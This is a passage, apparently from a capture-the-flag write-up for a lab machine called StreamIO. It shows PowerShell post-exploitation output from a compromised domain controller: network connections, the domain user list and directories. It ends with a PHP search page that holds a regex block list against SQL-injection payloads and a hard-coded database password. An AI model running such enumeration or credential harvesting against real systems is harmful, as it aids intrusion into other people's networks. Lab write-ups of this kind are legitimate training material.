class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\inetpub\streamio.htb\admin&gt; netstat -ano<br><br>Active Connections<br><br>  Proto  Local Address          Foreign Address        State           PID<br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">80</span>             <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">88</span>             <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">135</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">892</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">389</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">443</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">445</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">464</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">593</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">892</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">636</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">1433</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">3452</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">3268</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">3269</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5985</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">9389</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">2628</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">47001</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49664</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">472</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49665</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">1140</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49666</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">1532</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49667</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49673</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49674</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49679</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">616</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49737</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">2756</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">53</span>        <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">2756</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">139</span>       <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">389</span>       <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">49736</span>     ESTABLISHED     <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">443</span>       <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.30</span>:<span class="hljs-number">33474</span>      ESTABLISHED     <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">443</span>       <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.30</span>:<span class="hljs-number">34162</span>      ESTABLISHED     <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">49736</span>     <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">389</span>       ESTABLISHED     <span class="hljs-number">2756</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">55361</span>     <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.30</span>:<span class="hljs-number">443</span>        ESTABLISHED     <span class="hljs-number">4580</span><br>  TCP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">53</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">2756</span><br>  TCP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">389</span>          <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">49731</span>        ESTABLISHED     <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">389</span>          <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">55352</span>        ESTABLISHED     <span class="hljs-number">644</span><br>  TCP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">49731</span>        <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">389</span>          ESTABLISHED     <span class="hljs-number">2756</span><br>  TCP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">55352</span>        <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">389</span>          ESTABLISHED     <span class="hljs-number">2628</span><br>  TCP    [::]:<span class="hljs-number">80</span>                [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">4</span><br>  TCP    [::]:<span class="hljs-number">88</span>                [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">644</span><br>  TCP    [::]:<span class="hljs-number">135</span>               [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">892</span><br>  TCP    [::]:<span class="hljs-number">443</span>               [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">4</span><br>  TCP    [::]:<span class="hljs-number">445</span>               [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">4</span><br>  TCP    [::]:<span class="hljs-number">464</span>               [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">644</span><br>  TCP    [::]:<span class="hljs-number">593</span>               [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">892</span><br>  TCP    [::]:<span class="hljs-number">1433</span>              [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">3452</span><br>  TCP    [::]:<span class="hljs-number">3268</span>              [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">644</span><br>  TCP    [::]:<span class="hljs-number">3269</span>              [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">644</span><br>  TCP    [::]:<span class="hljs-number">5985</span>              [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">4</span><br>  TCP    [::]:<span class="hljs-number">9389</span>              [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2628</span><br>  TCP    [::]:<span class="hljs-number">47001</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">4</span><br>  TCP    [::]:<span class="hljs-number">49664</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">472</span><br>  TCP    [::]:<span class="hljs-number">49665</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">1140</span><br>  TCP    [::]:<span class="hljs-number">49666</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">1532</span><br>  TCP    [::]:<span class="hljs-number">49667</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">644</span><br>  TCP    [::]:<span class="hljs-number">49673</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">644</span><br>  TCP    [::]:<span class="hljs-number">49674</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">644</span><br>  TCP    [::]:<span class="hljs-number">49679</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">616</span><br>  TCP    [::]:<span class="hljs-number">49737</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2756</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">53</span>               [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2756</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">3268</span>             [::<span class="hljs-number">1</span>]:<span class="hljs-number">55355</span>            ESTABLISHED     <span class="hljs-number">644</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">49673</span>            [::<span class="hljs-number">1</span>]:<span class="hljs-number">49700</span>            ESTABLISHED     <span class="hljs-number">644</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">49678</span>            [::<span class="hljs-number">1</span>]:<span class="hljs-number">49673</span>            TIME_WAIT       <span class="hljs-number">0</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">49690</span>            [::<span class="hljs-number">1</span>]:<span class="hljs-number">135</span>              TIME_WAIT       <span class="hljs-number">0</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">49691</span>            [::<span class="hljs-number">1</span>]:<span class="hljs-number">49673</span>            TIME_WAIT       <span class="hljs-number">0</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">49696</span>            [::<span class="hljs-number">1</span>]:<span class="hljs-number">49673</span>            TIME_WAIT       <span class="hljs-number">0</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">49699</span>            [::<span class="hljs-number">1</span>]:<span class="hljs-number">135</span>              TIME_WAIT       <span class="hljs-number">0</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">49700</span>            [::<span class="hljs-number">1</span>]:<span class="hljs-number">49673</span>            ESTABLISHED     <span class="hljs-number">3152</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">49703</span>            [::<span class="hljs-number">1</span>]:<span class="hljs-number">49673</span>            TIME_WAIT       <span class="hljs-number">0</span><br>  TCP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">55355</span>            [::<span class="hljs-number">1</span>]:<span class="hljs-number">3268</span>             ESTABLISHED     <span class="hljs-number">2628</span><br>  TCP    [dead:beef::<span class="hljs-number">1</span>da]:<span class="hljs-number">53</span>    [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2756</span><br>  TCP    [dead:beef::<span class="hljs-number">549b</span>:f627:<span class="hljs-number">893</span>c:c0fe]:<span class="hljs-number">53</span>  [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2756</span><br>  TCP    [fe80::<span class="hljs-number">549b</span>:f627:<span class="hljs-number">893</span>c:c0fe%<span class="hljs-number">12</span>]:<span class="hljs-number">53</span>  [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2756</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">123</span>            *:*                                    <span class="hljs-number">300</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">389</span>            *:*                                    <span class="hljs-number">644</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5353</span>           *:*                                    <span class="hljs-number">1080</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5355</span>           *:*                                    <span class="hljs-number">1080</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">64897</span>          *:*                                    <span class="hljs-number">2756</span><br>  UDP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">53</span>        *:*                                    <span class="hljs-number">2756</span><br>  UDP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">88</span>        *:*                                    <span class="hljs-number">644</span><br>  UDP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">137</span>       *:*                                    <span class="hljs-number">4</span><br>  UDP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">138</span>       *:*                                    <span class="hljs-number">4</span><br>  UDP    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">464</span>       *:*                                    <span class="hljs-number">644</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">53</span>           *:*                                    <span class="hljs-number">2756</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">60647</span>        *:*                                    <span class="hljs-number">2148</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">61067</span>        *:*                                    <span class="hljs-number">2628</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">61068</span>        *:*                                    <span class="hljs-number">2776</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">61069</span>        *:*                                    <span class="hljs-number">2756</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">61070</span>        *:*                                    <span class="hljs-number">1372</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">61071</span>        *:*                                    <span class="hljs-number">1296</span><br>  UDP    [::]:<span class="hljs-number">123</span>               *:*                                    <span class="hljs-number">300</span><br>  UDP    [::]:<span class="hljs-number">5353</span>              *:*                                    <span class="hljs-number">1080</span><br>  UDP    [::]:<span class="hljs-number">5355</span>              *:*                                    <span class="hljs-number">1080</span><br>  UDP    [::]:<span class="hljs-number">64898</span>             *:*                                    <span class="hljs-number">2756</span><br>  UDP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">53</span>               *:*                                    <span class="hljs-number">2756</span><br>  UDP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">61064</span>            *:*                                    <span class="hljs-number">2756</span><br>  UDP    [dead:beef::<span class="hljs-number">1</span>da]:<span class="hljs-number">53</span>    *:*                                    <span class="hljs-number">2756</span><br>  UDP    [dead:beef::<span class="hljs-number">1</span>da]:<span class="hljs-number">88</span>    *:*                                    <span class="hljs-number">644</span><br>  UDP    [dead:beef::<span class="hljs-number">1</span>da]:<span class="hljs-number">464</span>   *:*                                    <span class="hljs-number">644</span><br>  UDP    [dead:beef::<span class="hljs-number">549b</span>:f627:<span class="hljs-number">893</span>c:c0fe]:<span class="hljs-number">53</span>  *:*                                    <span class="hljs-number">2756</span><br>  UDP    [dead:beef::<span class="hljs-number">549b</span>:f627:<span class="hljs-number">893</span>c:c0fe]:<span class="hljs-number">88</span>  *:*                                    <span class="hljs-number">644</span><br>  UDP    [dead:beef::<span class="hljs-number">549b</span>:f627:<span class="hljs-number">893</span>c:c0fe]:<span class="hljs-number">464</span>  *:*                                    <span class="hljs-number">644</span><br>  UDP    [fe80::<span class="hljs-number">549b</span>:f627:<span class="hljs-number">893</span>c:c0fe%<span class="hljs-number">12</span>]:<span class="hljs-number">53</span>  *:*                                    <span class="hljs-number">2756</span><br>  UDP    [fe80::<span class="hljs-number">549b</span>:f627:<span class="hljs-number">893</span>c:c0fe%<span class="hljs-number">12</span>]:<span class="hljs-number">88</span>  *:*                                    <span class="hljs-number">644</span><br>  UDP    [fe80::<span class="hljs-number">549b</span>:f627:<span class="hljs-number">893</span>c:c0fe%<span class="hljs-number">12</span>]:<span class="hljs-number">464</span>  *:*                                    <span class="hljs-number">644</span><br>PS C:\inetpub\streamio.htb\admin&gt; <br><br><br>PS C:\inetpub\streamio.htb\admin&gt; net user<br><br>User accounts <span class="hljs-keyword">for</span> \\DC<br><br>-------------------------------------------------------------------------------<br>Administrator            Guest                    JDgodd                   <br>krbtgt                   Martin                   nikk37                   <br>yoshihide                <br>The command completed successfully.<br><br>PS C:\inetpub\streamio.htb\admin&gt; whoami<br>streamio\yoshihide<br>PS C:\inetpub\streamio.htb\admin&gt; net users /domain<br><br>User accounts <span class="hljs-keyword">for</span> \\DC<br><br>-------------------------------------------------------------------------------<br>Administrator            Guest                    JDgodd                   <br>krbtgt                   Martin                   nikk37                   <br>yoshihide                <br>The command completed successfully.<br><br>PS C:\inetpub\streamio.htb\admin&gt; net time /domain<br>Current time at \\DC.streamIO.htb is <span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2024</span> <span class="hljs-number">1</span>:<span class="hljs-number">59</span>:<span class="hljs-number">39</span> PM<br><br>The command completed successfully.<br><br>PS C:\inetpub\streamio.htb\admin&gt; <br><br><br>PS C:\inetpub\streamio.htb\admin&gt; cd C:/Users<br>PS C:\Users&gt; ls<br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">48</span> AM                .NET v4<span class="hljs-number">.5</span>                                                             <br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">48</span> AM                .NET v4<span class="hljs-number">.5</span> Classic                                                     <br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">20</span> AM                Administrator                                                         <br>d-----         <span class="hljs-number">5</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">5</span>:<span class="hljs-number">38</span> PM                Martin                                                                <br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">9</span>:<span class="hljs-number">48</span> AM                nikk37                                                                <br>d-r---        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span>:<span class="hljs-number">33</span> AM                Public                                                                <br><br><br>PS C:\Users&gt; <br><br><br>PS C:\inetpub&gt; cd watch.streamio.htb<br>PS C:\inetpub\watch.streamio.htb&gt; ls<br><br><br>    Directory: C:\inetpub\watch.streamio.htb<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">12</span>:<span class="hljs-number">38</span> AM                <span class="hljs-type">static</span>                                                                <br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">12</span>:<span class="hljs-number">29</span> AM            <span class="hljs-number">677</span> blocked.php                                                           <br>-a----        <span class="hljs-number">7</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">3</span>:<span class="hljs-number">02</span> AM           <span class="hljs-number">1150</span> favicon.ico                                                           <br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">12</span>:<span class="hljs-number">34</span> AM           <span class="hljs-number">2944</span> index.php                                                             <br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">3</span>:<span class="hljs-number">52</span> AM           <span class="hljs-number">2367</span> search.php                                                            <br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">12</span>:<span class="hljs-number">00</span> AM            <span class="hljs-number">452</span> web.config                                                            <br><br><br>PS C:\inetpub\watch.streamio.htb&gt; cat search.php<br>&lt;?php<br>$search = strtolower($_POST[<span class="hljs-string">&#x27;q&#x27;</span>]);<br><br><span class="hljs-comment">// sqlmap choker</span><br>$shitwords = [<span class="hljs-string">&quot;/WAITFOR/i&quot;</span>, <span class="hljs-string">&quot;/vkBQ/i&quot;</span>, <span class="hljs-string">&quot;/CHARINDEX/i&quot;</span>, <span class="hljs-string">&quot;/ALL/i&quot;</span>, <span class="hljs-string">&quot;/SQUARE/i&quot;</span>, <span class="hljs-string">&quot;/ORDER/i&quot;</span>, <span class="hljs-string">&quot;/IF/i&quot;</span>,<span class="hljs-string">&quot;/DELAY/i&quot;</span>, <span class="hljs-string">&quot;/NULL/i&quot;</span>, <span class="hljs-string">&quot;/UNICODE/i&quot;</span>,<span class="hljs-string">&quot;/0x/i&quot;</span>, <span class="hljs-string">&quot;/\*\*/&quot;</span>, <span class="hljs-string">&quot;/-- [a-z0-9]&#123;4&#125;/i&quot;</span>, <span class="hljs-string">&quot;ifnull/i&quot;</span>, <span class="hljs-string">&quot;/ or /i&quot;</span>];<br>foreach ($shitwords as $shitword) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match( $shitword, $search )) &#123;<br>                header(<span class="hljs-string">&quot;Location: https://watch.streamio.htb/blocked.php&quot;</span>);<br>                die(<span class="hljs-string">&quot;blocked&quot;</span>);<br>        &#125;<br>&#125;<br><br><br># Query section<br>$connection = <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;Database&quot;</span>=&gt;<span class="hljs-string">&quot;STREAMIO&quot;</span>, <span class="hljs-string">&quot;UID&quot;</span> =&gt; <span class="hljs-string">&quot;db_user&quot;</span>, <span class="hljs-string">&quot;PWD&quot;</span> =&gt; <span class="hljs-string">&#x27;B1@hB1@hB1@h&#x27;</span>);<br>$handle 